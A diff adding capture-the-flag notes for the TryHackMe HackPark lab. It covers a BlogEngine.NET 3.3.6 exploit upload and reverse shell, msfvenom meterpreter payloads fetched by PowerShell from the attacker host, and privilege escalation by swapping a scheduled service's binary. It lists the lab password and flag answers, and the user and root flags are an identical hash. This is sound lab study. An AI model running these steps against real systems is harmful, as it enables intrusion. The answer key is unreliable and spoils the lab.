@@ -21,6 +21,126 @@ is raw on request when F12->network
 1qaz2wsx
 
 
+#Task 3 Compromise the machine 
+- Now you have logged into the website, are you able to identify the version of the BlogEngine?
+hint: http://10.10.122.19/
+login with admin:1qaz2wsx
+--> about
+ 3.3.6.0 
+ 
+ 
+
+Use the exploit database archive to find an exploit to gain a reverse shell on this system.
+- What is the CVE?
+hint: searchsploit BlogEngine 3.3.6
+ Exploit Title                                                                        |  Path
+-------------------------------------------------------------------------------------- ---------------------------------
+BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                    | aspx/webapps/46353.cs
+BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution    | aspx/webapps/47010.py
+BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                               | aspx/webapps/47035.py
+BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Executi | aspx/webapps/47011.py
+BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                            | aspx/webapps/47014.py
+
+searchsploit -m aspx/webapps/46353.cs
+  Exploit: BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/46353
+     Path: /usr/share/exploitdb/exploits/aspx/webapps/46353.cs
+File Type: HTML document, ASCII text, with CRLF line terminators
+
+Copied to: /home/gd/46353.cs
+
+vi 46353.cs
+change ip:myip port:443
+mv 46353.cs PostView.asc
+Go to posts (http://10.10.122.194/admin/#/content/posts) and click on “Welcome to HackPark” to edit this post
+From the edit bar on top of the post, click on the “File Manager” icon
+Click on the “+ UPLOAD” button and upload the PostView.ascx script
+Close the file manager and click on “Save”
+
+open file PostView.asc
+http://10.10.10.10/?theme=../../App_Data/files
+change http://10.10.122.194/?theme=../../App_Data/files
+on my machine
+nc -lnvp 443
+c:\windows\system32\inetsrv>whoami
+iis apppool\blog
+
+#Task 4 Windows Privilege Escalation 
+Tip: You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.88.227 lport=2345 -f exe
+ -o revshell.exe
+on target machine c:\windows\system32\inetsrv>powershell -c "Invoke-WebRequest -Uri 'http://10.6.88.227:8000/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
+c:\Windows\Temp>revshell.exe
+
+on my machine
+msfconsole
+msf6>use exploit/multi/handler
+msf6>set payload windows/meterpreter/reverse_tcp
+set lport 2345
+set lhost 10.6.88.227
+run
+meterpreter>
+
+- What is the OS version of this windows machine?
+hint:meterpreter>sysinfo
+Windows 2012 R2 (6.3 Build 9600)
+
+
+
+Further enumerate the machine.
+- What is the name of the abnormal service running?
+hint: meterpreter>ps
+WScheduler.exe
+meterpreter>upload /home/gd/winPEASx64.exe
+on c:\Windows\Temp>winPEASx64.exe
+WindowsScheduler
+
+Key: WScheduler
+    Folder: C:\Program Files (x86)\SystemScheduler
+
+
+- What is the name of the binary you're supposed to exploit? 
+hint: meterpreter>cd "c:\program files (x86)\SystemScheduler"
+ls
+cd Events
+ls
+cat 20198415519.INI_LOG.txt
+view see process Message.exe run 30'
+Message.exe
+
+
+
+Using this abnormal service, escalate your privileges!
+- What is the user flag (on Jeffs Desktop)?
+hint:
+on my machine
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.88.227 lport=4443 -f exe > Message.exe
+meterpreter>cd ..
+meterpreter>mv Message.exe Message.exe.old
+meterpreter>upload /home/gd/Message.exe
+on tab my machine
+msfconsole
+msfconsole
+msf6>use exploit/multi/handler
+msf6>set payload windows/meterpreter/reverse_tcp
+set lport 4443
+set lhost 10.6.88.227
+run
+meterpreter>whoami
+HACKPARK\Administrator
+cd "c:\Users\jeff\Desktop\"
+cat user.txt
+7e13d97f05f7ceb9881a3eb3d78d3e72
+
+
+- What is the root flag?
+hint: meterpreter>cd "c:\Users\Administrator\Desktop\"
+cat root.txt
+7e13d97f05f7ceb9881a3eb3d78d3e72
+
+
+
+
 https://tryhackme.com/room/hackpark
 https://steflan-security.com/tryhackme-hackpark-walkthrough/
 https://www.aldeid.com/wiki/TryHackMe-HackPark
